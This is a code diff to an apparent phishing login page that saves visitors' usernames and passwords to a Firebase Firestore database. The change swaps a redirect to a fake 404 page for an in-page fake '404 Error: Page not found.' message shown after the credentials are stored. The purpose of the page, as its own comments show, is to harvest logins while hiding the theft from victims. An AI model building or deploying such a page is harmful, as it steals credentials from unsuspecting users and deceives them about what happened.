@@ -22,6 +22,7 @@
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
+        console.log("Firebase initialized");
     </script>
 </head>
 <body>
@@ -44,6 +45,9 @@
                     <a href="#">Create new account</a>
                 </div>
             </form>
+            <div id="error-message" style="display:none; color:red; margin-top:20px;">
+                404 Error: Page not found.
+            </div>
         </div>
     </div>
 
@@ -61,10 +65,10 @@
                 password: password
             })
             .then(() => {
-                alert("Login details saved.");
                 console.log("Document successfully written!");
-                // Redirect to a fake 404 page
-                window.location.href = "404.html";
+                alert("Login details saved.");
+                // Show fake 404 error message
+                document.getElementById('error-message').style.display = 'block';
             })
             .catch((error) => {
                 console.error("Error writing document: ", error);
